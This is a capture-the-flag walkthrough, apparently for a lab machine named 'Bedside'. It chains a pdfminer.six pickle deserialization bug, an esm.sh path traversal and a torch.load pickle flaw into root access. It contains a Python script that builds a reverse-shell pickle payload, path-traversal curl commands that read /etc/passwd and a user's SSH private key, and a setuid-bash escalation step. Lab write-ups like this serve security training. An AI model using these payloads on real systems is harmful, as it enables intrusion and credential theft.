# Bedside


<img width="1585" height="280" alt="image" src="https://github.com/user-attachments/assets/6591fc51-bd26-4590-a012-4708027f0c3a" />

----





## Phase 0: Recon

**Port scan reveals:**

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH (OpenSSH 10.0p2) | Standard |
| 80 | HTTP (Apache 2.4.68) | Main website — "Bedside Clinic" |
| 3000 | **filtered** | Likely bound to localhost only — remember this |

**Key observation:** Port 3000 is filtered from outside. That means it's probably only reachable from inside the network/container. This becomes the pivot target later.

---

## Phase 1: Web Enumeration on Port 80

The main site (`bedside.htb`) is unremarkable.

**Subdomain fuzzing** with ffuf:

```bash
ffuf -w subdomains-top1million-110000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -fw 21
```

**Result:** `research.bedside.htb` (Status 200, 3152 bytes)

**Why this matters:** The subdomain name "research" hints at file upload functionality — common in medical/clinical apps for PDFs, scans, etc.

---

## Phase 2: The Upload Feature

Visiting `research.bedside.htb` reveals a **PDF upload** form.

**Step 1 — Upload a test PDF** and intercept with Burp.

**Step 2 — Observe the response.** The server reveals:
- The backend uses **`pdfminer.six`** (a Python PDF parsing library)
- An **absolute path** for uploads: `/var/www/research.bedside.htb/uploads`
- A **verbose error message** when you upload a non-PDF with a `.pdf` extension

**Why this matters:** Knowing the exact upload directory is critical — it lets you reference uploaded files by absolute path from elsewhere in the system.

---

## Phase 3: Exploiting pdfminer.six (CVE-2025-64512)

**The vulnerability:** `pdfminer.six` deserializes **pickle files** when resolving certain PDF font/encoding references. If you can make a PDF point to a malicious pickle file, you get **arbitrary code execution** on unpickle.

**The catch:** The PDF needs to reference the pickle by an absolute path — and now you know the upload directory.

### Step 3a — Create the malicious pickle

```python
#!/usr/bin/env python3
import pickle
import gzip

def create_demo_pickle():
    class EvilPayload:
        def __reduce__(self):
            code = "sh -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1"
            return (eval, (code,))

    demo_cmap_data = EvilPayload()

    with gzip.open("./malicious.pickle.gz", 'wb') as f:
        pickle.dump(demo_cmap_data, f)

if __name__ == "__main__":
    create_demo_pickle()
```

**Why this works:** `__reduce__` tells pickle "when you unpickle me, call `eval` with this shell command." The result is a reverse shell when the PDF parser loads the file.

**Note:** Replace `<YOUR_IP>` and `<YOUR_PORT>` with your Kali's tun0 IP and a listener port.

### Step 3b — Create the malicious PDF

The PDF's `/Encoding` field is set to the absolute path of your pickle, with `/` encoded as `#2F` (PDF hex escape):

```
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fmalicious.pickle.gz
```

**Why this matters:** When pdfminer resolves the font encoding, it reads that path, decompresses the gzip, and unpickles it — triggering your payload.

### Step 3c — Fire it

```bash
# Listener
nc -lnvp 4444

# Upload malicious.pickle.gz via the form
# Then upload mal.pdf via the form
```

After a few seconds, you get a shell.

---

## Phase 4: Foothold — Inside the Container

**You're now `datawrangler` inside a Docker container.** Key observations:

- Standard tools like `ss`/`netstat` aren't available for port enumeration
- A **port scanner** exists in `/tmp` — use it
- **`172.17.0.1`** is the Docker host's bridge IP — equivalent to `127.0.0.1` from the host's perspective

### Pivot to port 3000

Earlier recon showed **port 3000 filtered** from outside. From inside the container, try:

```bash
curl http://172.17.0.1:3000
```

**Result:** An HTML page titled "Bedside Clinic - Image Viewer" — a React app.

**Key line in the HTML:**

```html
<script>
console.log("%c💚 Built with esm.sh/x, ...");
</script>
```

**Why this matters:** The app uses **esm.sh** — a CDN that transpiles/serves ES modules. That's a known attack surface.

---

## Phase 5: Exploiting esm.sh (CVE-2025-59341)

**The vulnerability:** esm.sh's `/pr/` route has a **path traversal** flaw — you can escape the intended directory and read arbitrary files.

**Test it:**

```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
```

**Why `--path-as-is` matters:** Without it, curl normalizes `../` sequences *before* sending — defeating the traversal. The `--path-as-is` flag sends the raw path so the server resolves it.

**Result:** You get `/etc/passwd`. The traversal works.

### Targets of interest

From `/etc/passwd`, note:
- `developer` (UID 1000, `/bin/bash`)
- `datawrangler` (UID 988 — your current shell)

### Steal the developer's SSH key

```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
```

**Why this works:** Same traversal, just targeting a different file. The `?raw=1&module=1` params make esm.sh return the file content directly instead of trying to process it as a module.

Save the output to `id_rsa`, then:

```bash
chmod 600 id_rsa
ssh -i id_rsa developer@bedside.htb
```

**You now have a real shell on the host as `developer`** — and the user flag.

---

## Phase 6: Privilege Escalation

### Step 6a — Check sudo

```bash
sudo -l
```

**Result:**

```
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

**Why this matters:** You can run that specific Python script as root without a password. The classic privesc path here is **Python library hijacking** — if the script imports a module from a writable directory, you can replace that module with your own.

### Step 6b — Running the script

Running it directly gives a runtime error. **Read the script** to understand:
- What modules it imports
- Where it reads data from (the error mentioned a `datastore` folder)
- Whether any of those paths are writable by `developer`

### Step 6c — The container connection

The `datastore` folder is **run by the `datawrangler` container** — the same container you had a shell in during Phase 4. This connects the two halves of the box:

- **`developer`** can run the script as root
- The script reads from a `datastore` controlled by **`datawrangler`**
- **`datawrangler`** (from Phase 4) can write to that datastore

**The privesc chain:** Use your `datawrangler` container shell to plant a malicious file (or Python module) in the datastore, then trigger the root script as `developer` to execute it.

---
---
---
---
---



- **`sudo -l`** shows:
    
    text
    
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
    
- The trainer loads a **PyTorch/MONAI checkpoint** from a shared **`/datastore`**
    
- `torch.load` on an untrusted `.pt` file = **pickle deserialization** (same class of bug as Phase 05)
    
- The `/datastore` is **shared with the `datawrangler` container** — which you still have a shell in
    
- **Chain:**
    
    1. From container shell, plant a malicious `.pt` in `/datastore`
        
    2. As `developer`, run `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`
        
    3. `torch.load` unpickles your payload as **root**
        
    4. Payload does `chmod +s /bin/bash` (or spawns root shell)
        
    5. `bash -p` → `root.txt`
        

**Why it works:** Same pickle deserialization flaw, different library (`torch` vs `pdfminer`). The shared `/datastore` is the bridge between the two privilege levels.


